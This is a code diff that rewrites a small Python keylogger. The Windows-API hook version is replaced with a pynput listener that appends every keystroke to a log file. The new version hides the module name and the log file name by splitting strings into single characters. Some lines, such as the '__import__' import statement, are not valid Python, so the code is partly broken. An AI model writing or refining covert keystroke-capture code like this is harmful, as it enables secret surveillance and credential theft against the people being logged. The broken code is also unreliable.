@@ -1,16 +1,16 @@
-import _thread
-from ctypes import windll
-
+import __import__('p'+'y'+'n'+'p'+'u'+'t') as pynput
+from pynput import keyboard
 def on_press(key):
-    with windll.kernel32.LockResource(0):
-        try:
-            k = key.char
-        except AttributeError:
-            k = str(key)
-        with open("k.txt", "a") as f:
-            f.write(k)
-        print(f"Key pressed: {k}")
-
-windll.user32.SetWindowsHookExA(13, on_press, 0, 0)
-while True:
-    windll.kernel32.Sleep(100)
+    try:
+        with open(''.join(['k', 'e', 'y', 'l', 'o', 'g', 's', '.', 't', 'x', 't']), 'a') as f:
+            f.write(key.char)
+        print(f'Alphanumeric key pressed: {key.char}')
+    except AttributeError:
+        with open(''.join(['k', 'e', 'y', 'l', 'o', 'g', 's', '.', 't', 'x', 't']), 'a') as f:
+            f.write(str(key))
+        print(f'Special key pressed: {key}')
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
